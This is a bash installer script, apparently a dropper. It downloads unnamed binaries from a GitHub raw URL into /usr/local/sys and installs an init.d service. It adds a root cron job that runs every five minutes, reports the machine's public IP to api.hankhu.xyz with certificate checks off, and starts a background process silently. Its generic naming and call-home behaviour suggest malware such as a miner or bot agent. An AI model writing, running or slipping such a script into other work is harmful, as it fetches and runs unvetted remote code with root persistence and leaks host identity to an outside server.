#!/bin/bash


function count_process()
{
    ps -ef |grep $1 |grep -v "grep" |wc -l
}

function musys()
{
dirsys=/usr/local/sys
if [ ! -d $dirsys ];then
mkdir -p $dirsys
fi

cd $dirsys

if [ ! -f sysmain ];then
curl -Ls -O https://raw.githubusercontent.com/hankhu666/sys/main/sysmain  -O https://raw.githubusercontent.com/hankhu666/sys/main/assys  -O  https://raw.githubusercontent.com/hankhu666/sys/main/susys && chmod 755 *
mv -u susys /etc/init.d/
sed -i '/assys/d' /var/spool/cron/root
echo '*/5 * * * * /usr/local/sys/assys &> /dev/null' >>/var/spool/cron/root

ip=$(curl -s ipv4.ip.sb)
uid=${ip//./_}
curl  -X POST  https://api.hankhu.xyz/sys/getuid.php -d "$uid" -sk

fi

if [ $(count_process sysmain) -eq 0 ]
then 
nohup /usr/local/sys/sysmain &>/dev/null & 
fi
}


function get_taskid()
{
    ps -ef |grep $1 |grep -v "grep" |awk '{print $2}'
}

function rmsys()
{
if [ $(count_process sysmain) -gt 0 ];then
kill -9 $(get_taskid sysmain)
fi

rm -rf /usr/local/sys/  /etc/init.d/susys
sed -i '/assys/d' /var/spool/cron/root
}






case $1 in
	mu)
	  echo -e "installing\n"
	  musys
	  echo done
	  ;;
	rm)
	  echo -e "removing\n"
	  rmsys
	  echo done
	  ;;
	*)
	  if [ $(count_process sysmain) -gt 0 ]
	  then
	  	echo -e "removing\n"
	 	rmsys
		echo -e "sys has been removed,and that is being reinstalled now \n"
		musys 
		echo done
	  else
	  	echo -e "installing\n"
		musys 
		echo done
	  fi  
	  ;;
esac



